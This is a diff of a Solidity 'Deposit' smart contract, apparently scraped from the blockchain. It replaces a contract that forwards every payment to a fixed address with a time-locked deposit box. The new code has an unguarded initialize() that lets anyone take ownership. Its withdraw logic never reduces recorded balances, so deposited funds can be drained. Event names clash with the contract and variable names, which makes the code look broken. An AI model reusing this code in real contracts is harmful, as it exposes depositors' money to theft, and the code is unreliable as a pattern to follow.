@@ -1,22 +1,59 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Deposit at 0x6b599a32fac9484dd79e45ba75cb180c4e5fdeaf
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Deposit at 0x625f220be6440c14f3481072f1cbe9a83a58ec75
 */
-pragma solidity ^0.4.11;
+pragma solidity ^0.4.15;
 
 contract Deposit {
-    /* Constructor */
-    function Deposit() {
-
+    address public Owner;
+    
+    mapping (address => uint) public deposits;
+    
+    uint public ReleaseDate;
+    bool public Locked;
+    
+    event Initialized();
+    event Deposit(uint Amount);
+    event Withdrawal(uint Amount);
+    event ReleaseDate(uint date);
+    
+    function initialize() payable {
+        Owner = msg.sender;
+        ReleaseDate = 0;
+        Locked = false;
+        Initialized();
     }
 
-    event Received(address from, address to, uint value);
-
-    function() payable {
-        if (msg.value > 0) {
-            Received(msg.sender, this, msg.value);
-            m_account.transfer(msg.value);
+    function setReleaseDate(uint date) public payable {
+        if (isOwner() && !Locked) {
+            ReleaseDate = date;
+            Locked = true;
+            ReleaseDate(date);
         }
     }
 
-    address public m_account = 0x0C99a6F86eb73De783Fd5362aA3C9C7Eb7F8Ea16;
+    function() payable { revert(); } // call deposit()
+    
+    function deposit() public payable {
+        if (msg.value >= 0.25 ether) {
+            deposits[msg.sender] += msg.value;
+            Deposit(msg.value);
+        }
+    }
+
+    function withdraw(uint amount) public payable {
+        withdrawTo(msg.sender, amount);
+    }
+    
+    function withdrawTo(address to, uint amount) public payable {
+        if (isOwner() && isReleasable()) {
+            uint withdrawMax = deposits[msg.sender];
+            if (withdrawMax > 0 && amount <= withdrawMax) {
+                to.transfer(amount);
+                Withdrawal(amount);
+            }
+        }
+    }
+
+    function isReleasable() public constant returns (bool) { return now >= ReleaseDate; }
+    function isOwner() public constant returns (bool) { return Owner == msg.sender; }
 }
